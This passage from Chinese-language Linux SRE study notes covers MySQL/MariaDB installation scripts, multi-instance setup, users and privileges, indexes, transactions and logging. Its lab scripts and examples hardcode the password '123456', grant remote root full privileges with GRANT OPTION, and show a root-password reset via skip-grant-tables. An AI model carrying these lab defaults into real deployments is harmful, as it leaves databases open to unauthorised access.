    echo "安装文件不存在"
    exit 3
fi
if [ -h /usr/local/mysql ];then
    echo "Mysql 已经安装"
    exit 3
else
    tar xvf ${FULL_NAME}   -C /usr/local/src
    ln -sv /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64 /usr/local/mysql
    if id mysql;then
        echo "mysql 用户已经存在，跳过创建用户过程"
    else
       useradd  -r   -s /sbin/nologin mysql
     fi

    if id mysql;then
        chown  -R mysql.mysql /usr/local/mysql/* 
        if [ ! -d /data/mysql ];then
            mkdir -pv /data/mysql && chown  -R mysql.mysql /data   -R
           /usr/local/mysql/scripts/mysql_install_db  --user=mysql --
datadir=/data/mysql  --basedir=/usr/local/mysql/
 cp /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
           chmod a+x /etc/init.d/mysqld
           cp ${DIR}/my.cnf   /etc/my.cnf
           ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
           /etc/init.d/mysqld start
          chkconfig --add mysqld
          else
            echo "MySQL数据目录已经存在,"
            exit 3
         fi
    fi
fi

[root@centos8 ~]#cat /etc/my.cnf
[mysqld]
socket=/data/mysql.sock
user=mysql
symbolic-links=0
datadir=/data/mysql
innodb_file_per_table=1
[client]
port=3306
socket=/data/mysql.sock
[mysqld_safe]
log-error=/var/log/mysqld.log
pid-file=/tmp/mysql.sock
[root@centos8 ~]#ls
install_mysql5.6.sh my.cnf mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz



#2.在线安装mysql-5.6
###################################################################
# File Name: install_mysql_online.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash

. /etc/init.d/functions
DIR=`pwd`
MYSQL_VERSION=5.6.51
NAME="mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.6
DATA_DIR="/data/mysql"

rpm -q wget || yum -y -q install wget
wget $URL/$NAME || { action"下载失败,异常退出" false;exit 10; }
yum install -y -q libaio perl-Data-Dumper autoconf
if [ -f ${FULL_NAME} ];then
    action "安装文件存在"
else
    action "安装文件不存在" false
    exit 3
fi

if [ -e /usr/local/mysql ];then
   action "Mysql 已经安装" false
   exit 3
else
   tar xf ${FULL_NAME} -C /usr/local/src
   ln -sv /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64 /usr/local/mysql
   if id mysql;then
      action "mysql 用户已经存在，跳过创建用户过程"
   else
      useradd -r -s /sbin/nologin mysql
   fi

   if id mysql;then
       chown -R mysql.mysql /usr/local/mysql/*
       if [ ! -d /data/mysql ];then
         mkdir -pv /data/mysql && chown -R mysql.mysql /data
         /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql --basedir=/usr/local/mysql/
         cp /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
         chmod a+x /etc/init.d/mysqld
         cat > /etc/my.cnf << EOF
         [mysqld]
         socket=/data/mysql/mysql.sock
         user=mysql
         symbolic-links=0
         datadir=/data/mysql
         innodb_file_per_table=1
         [client]
         port=3306
         socket=/data/mysql/mysql.sock
         [mysqld_safe]
         log-error=/var/log/mysqld.log
         pid-file=/tmp/mysql.sock
EOF
          ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
         /etc/init.d/mysqld start
         chkconfig --add mysqld
     else
         action "MySQL数据目录已经存在" false
         exit 3
     fi
  fi
fi
```

![1653211662444](linuxSRE.assets/1653211662444.png)

##### 35.1.2.2一键安装MySQL5.7and8.0

```
#1.离线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions 
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.19-linux-glibc2.12-x86_64.tar.gz'
COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456

check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
		$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
	return
fi
} 

install_mysql(){
    $COLOR"开始安装MySQL数据库..."$END
	yum  -y -q install libaio numactl-libs   libaio &> /dev/null
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }
        
    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
    .  /etc/profile.d/mysql.sh
	ln -s /usr/local/mysql/bin/* /usr/bin/
    cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                 
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
	sleep 3
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成" 
}

check
install_mysql


#2.在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.23-linux-glibc2.12-x86_64.tar.gz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成"
}

check
install_mysql
```

**安装mysql5.7成功**

![1653217120718](linuxSRE.assets/1653217120718.png)

**安装mysql8.0成功**

![1653226873770](linuxSRE.assets/1653226873770.png)

#### 35.1.2源码编译安装

```
#1.安装相关依赖包
[root@centos7_clone1 ~]#yum -y install gcc gcc-c++ cmake bison bison-devel zlib-devel libcurl-devel libarchive-devel boost-devel   ncurses-devel gnutls-devel libxml2-devel openssl-devel libevent-devel libaio-devel perl-Data-Dumper

#2.做准备用户和数据目录
[root@centos7_clone1 ~]# useradd -r -s /sbin/nologin -d /data/mysql mysql
[root@centos7_clone1 ~]# id mysql
uid=997(mysql) gid=995(mysql) groups=995(mysql

#3.准备数据库目录
[root@centos7_clone1 ~]# mkdir /data/mysql
[root@centos7_clone1 ~]# chown mysql.mysql /data/mysql
#到mysql官网下载源码包
https://downloads.mysql.com/archives/community/

#4.源码编译安装
[root@centos7_clone1 ~]# tar xvf mysql-5.6.51.tar.gz -C /usr/local/src/
[root@centos7_clone1 ~]# cd /usr/local/src/mysql-5.6.51/
[root@centos7_clone1 mysql-5.6.51]# cmake . \
 -DCMAKE_INSTALL_PREFIX=/app/mysql \
 -DMYSQL_DATADIR=/data/mysql/ \
 -DSYSCONFDIR=/etc/ \
 -DMYSQL_USER=mysql \
 -DWITH_INNOBASE_STORAGE_ENGINE=1 \
 -DWITH_ARCHIVE_STORAGE_ENGINE=1 \
 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \
 -DWITH_PARTITION_STORAGE_ENGINE=1 \
 -DWITHOUT_MROONGA_STORAGE_ENGINE=1 \
 -DWITH_DEBUG=0 \
 -DWITH_READLINE=1 \
 -DWITH_SSL=system \
 -DWITH_ZLIB=system \
 -DWITH_LIBWRAP=0 \
 -DENABLED_LOCAL_INFILE=1 \
 -DMYSQL_UNIX_ADDR=/data/mysql/mysql.sock \
 -DDEFAULT_CHARSET=utf8 \
 -DDEFAULT_COLLATION=utf8_general_ci
VMare内存调到最大，cpu核数调到你主机能支持的最大范围
提示：如果出错，执行rm -f CMakeCache.txt
[root@centos7_clone1 mysql-5.6.51]# ll /app/mysql/   #mysql程序的路径
[root@centos7_clone1 mysql-5.6.51]# ll /data/mysql/  #存放数据库的路径

#5.准备环境变量
[root@centos7_clone1 mysql-5.6.51]# echo 'PATH=/app/mysql/bin:$PATH' > /etc/profile.d/mysql.sh
[root@centos7_clone1 mysql-5.6.51]# . /etc/profile.d/mysql.sh


#6.生成数据库文件
[root@centos7_clone1 mysql]# cd /app/mysql/
[root@centos7_clone1 mysql]# pwd
/app/mysql
[root@centos7_clone1 mysql]# scripts/mysql_install_db --datadir=/data/mysql/ --user=mysql
[root@centos7_clone1 mysql]# ll /data/mysql/ -l
total 110600
-rw-rw---- 1 mysql mysql 12582912 May 23 07:56 ibdata1
-rw-rw---- 1 mysql mysql 50331648 May 23 07:56 ib_logfile0
-rw-rw---- 1 mysql mysql 50331648 May 23 07:56 ib_logfile1
drwx------ 2 mysql mysql     4096 May 23 07:56 mysql
drwx------ 2 mysql mysql     4096 May 23 07:56 performance_schema
drwx------ 2 mysql mysql        6 May 23 07:56 test

#7.准备配置文件
[root@centos7_clone1 mysql]# cp /app/mysql/support-files/my-default.cnf  /etc/my.cnf
[root@centos7_clone1 mysql]# cp /app/mysql/support-files/mysql.server /etc/init.d/mysqld
[root@centos7_clone1 mysql]# chkconfig --add mysqld
[root@centos7_clone1 mysql]# chkconfig --list
mysqld         	0:off	1:off	2:on	3:on	4:on	5:on	6:off
netconsole     	0:off	1:off	2:off	3:off	4:off	5:off	6:off
network        	0:off	1:off	2:on	3:on	4:on	5:on	6:off

#8.准备启动脚本,并启动服务
[root@centos7_clone1 mysql]# service mysqld start

#9.安全初始化
[root@centos7_clone1 mysql]#mysql_secure_installation
```

### 35.2 实现MySQL多实例

```
#1.前提准备
#基于centos8做实验：mariadb
关闭SElinux
关闭防火墙
时间同步

#2.安装mariadb
[root@centos8 ~]# yum -y install mariadb-server


#3.准备三个实例的目录
[root@centos8 ~]# mkdir -pv /mysql/{3306,3307,3308}/{data,etc,socket,log,bin,pid}
[root@centos8 ~]# chown -R mysql.mysql /mysql
[root@centos8 ~]# ll /mysql/
total 0
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3306
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3307
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3308


#4.生成数据库文件
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3306/data --user=mysql
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3307/data --user=mysql
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3308/data --user=mysql
#看看数据库必备文件有没有生成
[root@centos8 ~]# ls /mysql/3306/data/ -l


#5.准备配置文件
[root@centos8 ~]# vim /mysql/3306/etc/my.cnf
[mysqld]
port=3306
datadir=/mysql/3306/data
socket=/mysql/3306/socket/mysql.sock
log-error=/mysql/3306/log/mysql.log
pid-file=/mysql/3306/pid/mysql.pid
[root@centos8 ~]# sed 's/3306/3307/' /mysql/3306/etc/my.cnf > /mysql/3307/etc/my.cnf
[root@centos8 ~]# sed 's/3306/3308/' /mysql/3306/etc/my.cnf > /mysql/3308/etc/my.cnf


#6.准备启动脚本
[root@centos8 ~]# vim /mysql/3306/bin/mysqld
#!/bin/bash
port=3306
mysql_user="root"
mysql_pwd=""
cmd_path="/usr/bin"
mysql_basedir="/mysql"
mysql_sock="${mysql_basedir}/${port}/socket/mysql.sock"

function_start_mysql(){
       if [ ! -e "$mysql_sock" ];then
         printf "Starting MySQL...\n"
       ${cmd_path}/mysqld_safe --defaults-file=${mysql_basedir}/${port}/etc/my.cnf &> /dev/null &
       else
         printf "MySQL is running...\n"
         exit
      fi
}

function_stop_mysql(){
    if [ ! -e "$mysql_sock" ];then
       printf "MySQL is stopped...\n"
       exit
    else
       printf "Stoping MySQL...\n"
       ${cmd_path}/mysqladmin -u ${mysql_user} -p${mysql_pwd} -S ${mysql_sock} shutdown
    fi
}

function_restart_mysql()
{
        printf "Restarting MySQL...\n"
        function_stop_mysql
        sleep 2
        function_start_mysql
}

case $1 in
start)
   function_start_mysql
;;
stop)
  function_stop_mysql
;;
restart)
   function_restart_mysql
   ;;
*)
        printf "Usage: ${mysql_basedir}/${port}/bin/mysqld {start|stop|restart}\n"
esac

[root@centos8 ~]# chmod +x /mysql/3306/bin/mysqld
[root@centos8 ~]# sed 's/3306/3307/' /mysql/3306/bin/mysqld > /mysql/3307/bin/mysqld
[root@centos8 ~]# sed 's/3306/3308/' /mysql/3306/bin/mysqld > /mysql/3308/bin/mysqld
[root@centos8 ~]# chmod +x /mysql/3307/bin/mysqld /mysql/3308/bin/mysqld

#7.启动服务
[root@centos8 ~]# /mysql/3306/bin/mysqld start
[root@centos8 ~]# /mysql/3307/bin/mysqld start
[root@centos8 ~]# /mysql/3308/bin/mysqld start
[root@centos8 ~]#ss -ntl
#查看端口
LISTEN    0         80                       *:3306                  *:*      
LISTEN    0         80                       *:3307                  *:*      
LISTEN    0         80                       *:3308                  *:*

#8.登录实例
[root@centos8 ~]# mysql -uroot -S /mysql/3306/socket/mysql.sock
#修改密码
[root@centos8 ~]# mysqladmin -uroot -S /mysql/3306/socket/mysql.sock password '123456'
#再次登录
[root@centos8 ~]# mysql -uroot -p123456 -S /mysql/3307/socket/mysql.sock


#9.设置为开机自动启动
[root@centos8 ~]# vim /etc/rc.d/rc.local
for i in {3306..3308};do /mysql/$i/bin/mysqld start;done
[root@centos8 ~]# chmod +x /etc/rc.d/rc.local
#发现启动失败，第一反应看日记
[root@centos8 ~]# cat /mysql/3306/log/mysql.log
```

### 35.3MySQL用户管理

```
#centos8
MariaDB [hellodb]> create user liu@'10.0.0.%';
此时允许10网段的主机连接，密码为空
MariaDB [hellodb]> select user,host,password from mysql.user；
+------+-----------+----------+
| user | host      | password |
+------+-----------+----------+
| root | localhost |          |
| root | centos8   |          |
| root | 127.0.0.1 |          |
| root | ::1       |          |
|      | localhost |          |
|      | centos8   |          |
| liu  | 10.0.0.%  |          |
+------+-----------+----------+
7 rows in set (0.000 sec)
#修改登录密码
MariaDB [hellodb]> alter user liu@'10.0.0.%' identified by '123456';
#更改密码
MariaDB [hellodb]> update mysql.user set password=password('123456') where user='root';

#centos7
[10:09:02 root@centos7 ~]#mysql -uliu -h10.0.0.8 #远程登录
[10:43:53 root@centos7 ~]#mysql -uliu -h10.0.0.8 -p123456 #修改密码后重新登录


#破解root密码
[root@centos8 ~]# vim /etc/my.cnf
加上下面俩行
[mysqld]
skip-grant-tables
skip-networking #安全保护机制
[root@centos8 ~]# systemctl restart mariadb
[root@centos8 ~]#mysql #直接mysql连
MariaDB [(none)]> flush privileges; #刷新
MariaDB [(none)]> alter user root@'localhost' identified by 'ubuntu';#修改密码
```

### 35.4MySQL权限管理

```
权限类别：
管理类
程序类
数据库级别
表级别
字段级别

管理类：
CREATE USER
FILE
SUPER
SHOW DATABASES
RELOAD
SHUTDOWN
REPLICATION SLAVE
REPLICATION CLIENT
LOCK TABLES
PROCESS
CREATE TEMPORARY TABLES

程序类：针对 FUNCTION、PROCEDURE、TRIGGER
CREATE
ALTER
DROP
EXCUTE

库和表级别：针对 DATABASE、TABLE
ALTER
CREATE
CREATE VIEW
DROP INDEX
SHOW VIEW
WITH GRANT OPTION：能将自己获得的权限转赠给其他用户

数据操作
SELECT
INSERT
DELETE
UPDATE

字段级别
SELECT(col1,col2,...)
UPDATE(col1,col2,...)
INSERT(col1,col2,...)

所有权限
ALL PRIVILEGES 或 ALL

#1.授予权限
创建修改，删除表的权限
grant create on testdb.* to developer@'192.168.0.%';
grant alter on testdb.* to developer@'192.168.0.%';
grant drop on testdb.* to developer@'192.168.0.%';
外键操作权限
grant references on testdb.* to developer@'192.168.0.%';
临时表权限
grant create temporary tables on testdb.* to developer@'192.168.0.%';
索引权限
grant index on testdb.* to developer@'192.168.0.%';

MariaDB [hellodb]> create user liu@'10.0.0.%' identified by '123456';
MariaDB [hellodb]> grant all on hellodb.* to liu@'10.0.0.%'; #允许liu账号管理hellodb下的所有内容
MariaDB [hellodb]> grant all on hellodb.* to liu@'10.0.0.%' WITH GRANT OPTION #权限传递
MariaDB [hellodb]> show grants for liu@'10.0.0.%'; #查看权限
MariaDB [hellodb]> grant all on *.* to root@'10.0.0.%' identified by '123456' WITH GRANT OPTION; #等于一个管理员账户，可以远程登录，还可以把权限交给第三方
MariaDB [hellodb]> select user,host,password from mysql.user;
+-------+-----------+-------------------------------------------+
| user  | host      | password                                  |
+-------+-----------+-------------------------------------------+
| root  | localhost | *3CD53EE62F8F7439157DF288B55772A2CA36E60C |
| root  | centos8   | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | 127.0.0.1 | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | ::1       | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
|       | localhost |                                           |
|       | centos8   |                                           |
| liu   | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| heman | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
+-------+-----------+-------------------------------------------+
9 rows in set (0.000 sec)


#centos7远程登录
[13:12:48 root@centos7 ~]#mysql -h10.0.0.8 -uroot -p123456


#2.取消权限
MariaDB [hellodb]> REVOKE DELETE ON *.* FROM 'testuser'@'10.0.0.%';
```

![1653369955501](linuxSRE.assets/1653369955501.png)

### 35.5Index索引

```
#1.创建索引
MariaDB [hellodb]> create index idx_name on student(name);
#查看搜索的时候是否利用到索引
MariaDB [hellodb]> explain select *from student where name ='lujunhao';

#2.删除索引
MariaDB [hellodb]> drop index idx_name on student;

#3.查看索引
MariaDB [hellodb]> show index from student;
#更精确的查看命令的执行结果
MariaDB [hellodb]> set profiling = ON；
MariaDB [hellodb]> show profiles;
+----------+------------+----------------------+
| Query_ID | Duration   | Query                |
+----------+------------+----------------------+
|        1 | 0.00024347 | select *from student |
+----------+------------+----------------------+
1 row in set (0.000 sec)
MariaDB [hellodb]> show profile for query 1;
#查看执行一条命令的每个阶段花的时间
+------------------------+----------+
| Status                 | Duration |
+------------------------+----------+
| Starting               | 0.000038 |
| Checking permissions   | 0.000005 |
| Opening tables         | 0.000015 |
| After opening tables   | 0.000003 |
| System lock            | 0.000003 |
| Table lock             | 0.000004 |
| Init                   | 0.000013 |
| Optimizing             | 0.000007 |
| Statistics             | 0.000009 |
| Preparing              | 0.000010 |
| Executing              | 0.000002 |
| Sending data           | 0.000088 |
| End of update loop     | 0.000008 |
| Query end              | 0.000002 |
| Commit                 | 0.000004 |
| Closing tables         | 0.000003 |
| Unlocking tables       | 0.000002 |
| Closing tables         | 0.000007 |
| Starting cleanup       | 0.000002 |
| Freeing items          | 0.000004 |
| Updating status        | 0.000012 |
| Reset for next command | 0.000002 |
+------------------------+----------+
22 rows in set (0.000 sec)
```

### 35.6MySQL锁管理和事务

```
#1.显式使用锁
加锁：
MariaDB [hellodb]> lock tables student read; #加读锁
MariaDB [hellodb]> update student set age=88 where id=2;
ERROR 1099 (HY000): Table 'student' was locked with a READ lock and can't be updated
#整个服务器加锁
MariaDB [hellodb]> flush tables with read lock;

#解锁
MariaDB [hellodb]> UNLOCK TABLES;

#2.管理事务
显式启动事务：
BEGIN
BEGIN WORK
START TRANSACTION

结束事务：
#提交
COMMIT
#回滚
ROLLBACK

自动提交：
MariaDB [hellodb]> set autocommit=0;
Query OK, 0 rows affected (0.000 sec)

MariaDB [hellodb]> select @@autocommit;
+--------------+
| @@autocommit |
+--------------+
|            0 |
+--------------+
1 row in set (0.000 sec)
MariaDB [hellodb]> delete from student;
MariaDB [hellodb]> rollback;可以后悔

#3.事务隔离级别
READ UNCOMMITTED 
可读取到未提交数据，产生脏读
READ COMMITTED
可读取到提交数据，但未提交数据不可读，产生不可重复读，即可读取到多个提交数据，导致每次读取数据不一致
REPEATABLE READ 
可重复读，多次读取数据都一致，产生幻读，即读取过程中，即使有其它提交的事务修改数据，仍只能读取到未修改前的旧数据。此为MySQL默认设置
MariaDB [(none)]> select @@tx_isolation;
+-----------------+
| @@tx_isolation  |
+-----------------+
| REPEATABLE-READ |
+-----------------+
1 row in set (0.000 sec)
SERIALIZABLE
可串行化，未提交的读事务阻塞修改事务（加读锁，但不阻塞读事务），或者未提交的修改事务阻
塞读事务（加写锁，其它事务的读，写都不可以执行）。会导致并发性能差

#修改mysql中的隔离级别
#方法一：
[root@centos8 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
找到[mysqld]下面添加你指定的隔离级别
transaction-isolation="READ UNCOMMITTED"
[root@centos8 ~]# systemctl restart mariadb

#方法二：
直接mariadb里面直接指定
SET tx_isolation='READ-UNCOMMITTED|READ-COMMITTED|REPEATABLE-READ|SERIALIZABLE'



MVCC和事务的隔离级别：
MVCC（多版本并发控制机制）只在REPEATABLE READ和READ COMMITTED两个隔离级别下工作。其
他两个隔离级别都和MVCC不兼容,因为READ UNCOMMITTED总是读取最新的数据行，而不是符合当前
事务版本的数据行。而SERIALIZABLE则会对所有读取的行都加锁
```

![1653406182755](linuxSRE.assets/1653406182755.png)

### 35.7MySQL日志管理

#### 35.7.1事务日志

```
#1.事务日志
事务日志：transaction log
redo log：实现 WAL（Write Ahead Log) ,数据更新前先记录
undo log：保存与执行的操作相反的操作,用于实现rollback

Innodb事务日志相关配置：
MariaDB [(none)]> show variables like '%innodb_log%';
+-----------------------------+----------+
| Variable_name               | Value    |
+-----------------------------+----------+
| innodb_log_buffer_size      | 16777216 |
| innodb_log_checksums        | ON       |
| innodb_log_compressed_pages | ON       |
| innodb_log_file_size        | 50331648 |
| innodb_log_files_in_group   | 2        |
| innodb_log_group_home_dir   | ./       |
| innodb_log_optimize_ddl     | ON       |
| innodb_log_write_ahead_size | 8192     |
+-----------------------------+----------+
8 rows in set (0.001 sec)

#1.1事务日志性能优化:
innodb_flush_log_at_trx_commit=0|1|2

1 此为默认值，日志缓冲区将写入日志文件，并在每次事务后执行刷新到磁盘。 这是完全遵守ACID特性
0 提交时没有写磁盘的操作; 而是每秒执行一次将日志缓冲区的提交的事务写入刷新到磁盘。 这样可提供更好的性能，但服务器崩溃可能丢失最后一秒的事务
2 每次提交后都会写入OS的缓冲区，但每秒才会进行一次刷新到磁盘文件中。 性能比0略差一些，但操作系统或停电可能导致最后一秒的交易丢失

MariaDB [(none)]> set global innodb_flush_log_at_trx_commit=2; #性能可大幅度提升，但安全性会稍弱
```

#### 35.7.2错误日志

```
#2错误日志
mysqld启动和关闭过程中输出的事件信息
mysqld运行中产生的错误信息
event scheduler运行一个event时产生的日志信息
在主从复制架构中的从服务器上启动从服务器线程时产生的信息

错误文件路径
SHOW GLOBAL VARIABLES LIKE 'log_error' ;

#2.1查看错误日记
[root@centos8 ~]# vim /etc/my.cnf.d/mariadb-server.cnf #在这个文件里定义错误日记的路径
[root@centos8 ~]# tail /var/log/mariadb/mariadb.log
```

#### 35.7.3通用日志

```
#3.通用日志
通用日志：记录对数据库的通用操作，包括:错误的SQL语句
通用日志可以保存在：file（默认值）或 table（mysql.general_log表）

#3.1通用日志相关设置
general_log=ON|OFF #开启关闭通用日志
general_log_file=HOSTNAME.log 
log_output=TABLE|FILE|NONE #存放到内存|文件

#3.2开启通用日志
MariaDB [(none)]> select @@general_log;
+---------------+
| @@general_log |
+---------------+
|             0 |
+---------------+
1 row in set (0.000 sec)
MariaDB [(none)]> show  variables like 'general_log';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log   | OFF   |
+---------------+-------+
1 row in set (0.003 sec)
MariaDB [(none)]> set global general_log=1;
Query OK, 0 rows affected (0.004 sec)
MariaDB [(none)]> show  variables like 'general_log';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log   | ON    |
+---------------+-------+
1 row in set (0.001 sec)
MariaDB [(none)]> select * from student;


#打开另外一个进程，查看通用日志
只要把set global general_log=1打开，就会生成centos8.log的通用日志文件，你执行什么操作都会在日志里面看见
[root@centos8 ~]# cd /data/mysql/
[root@centos8 mysql]# tail -f centos8.log
2022-05-25T05:07:32.117041Z	    3 Query	SELECT DATABASE()
2022-05-25T05:07:32.117170Z	    3 Init DB	hellodb
2022-05-25T05:07:32.118169Z	    3 Query	show databases
2022-05-25T05:07:32.118479Z	    3 Query	show tables
2022-05-25T05:07:45.096564Z	    3 Query	CREATE TABLE student (
id int UNSIGNED AUTO_INCREMENT PRIMARY KEY,
name VARCHAR(20) NOT NULL,
age tinyint UNSIGNED,
gender ENUM('M','F') default 'M'
)ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8
2022-05-25T05:09:29.701916Z	    3 Query	insert student (name,age)values('xiaoming',20)
2022-05-25T05:12:32.336925Z	    3 Query	select * from student

#存放到数据库中
mysql> show variables like 'log_output';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| log_output    | FILE  |
+---------------+-------+
1 row in set (0.00 sec)
mysql> set global log_output='table';
Query OK, 0 rows affected (0.00 sec)

mysql> show variables like 'log_output';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| log_output    | TABLE |
+---------------+-------+
1 row in set (0.00 sec)
现在日志已经不在centos8.log中显示了，已经存放到数据里面了
mysql> select *from general_log;
#也可以在配置文件里面查看日记
[root@centos8 mysql]# tail -f /data/mysql/mysql/general_log.CSV

#范例:查找执行次数最多的前三条语句
mysql> select argument,count(argument) from general_log group by argument order by count(argument) desc limit 3;
+---------------------------+-----------------+
| argument                 | count(argument) |
+---------------------------+-----------------+
| select * from teachers   |               6 |
| select * from general_log|               4 |
| select * from students   |               3 |
+---------------------------+-----------------+
3 rows in set (0.002 sec)

#范例:对访问的语句进行排序
[root@centos8 ~]#mysql -e 'select argument from mysql.general_log' | awk '{sql[$0]++}END{for(i in sql){print sql[i],i}}'|sort -nr
[root@centos8 ~]#mysql -e 'select argument from mysql.general_log' |sort |uniq -c |sort -nr
```

#### 35.7.4慢查询日志

```
#慢查询日志
慢查询日志：记录执行查询时长超出指定时长的操作

慢查询相关变量
slow_query_log=ON|OFF #开启或关闭慢查询，支持全局和会话，只有全局设置才会生成慢查询文件
long_query_time=N #慢查询的阀值，单位秒,默认为10s
slow_query_log_file=HOSTNAME-slow.log  #慢查询日志文件
log_slow_filter = admin,filesort,filesort_on_disk,full_join,full_scan,
query_cache,query_cache_miss,tmp_table,tmp_table_on_disk 
#上述查询类型且查询时长超过long_query_time，则记录日志
log_queries_not_using_indexes=ON  #工作中推荐使用,即使没达到阈值也会记录到慢查询中
句是否记录日志，默认OFF，即不记录
log_slow_rate_limit = 1 #多少次查询才记录，mariadb特有
log_slow_verbosity= Query_plan,explain #记录内容
log_slow_queries = OFF    #同slow_query_log，MariaDB 10.0/MySQL 5.6.1 版后已删除

mysql> select @@slow_query_log; #慢查询默认没开启
+------------------+
| @@slow_query_log |
+------------------+
|                0 |
+------------------+
1 row in set (0.00 sec)

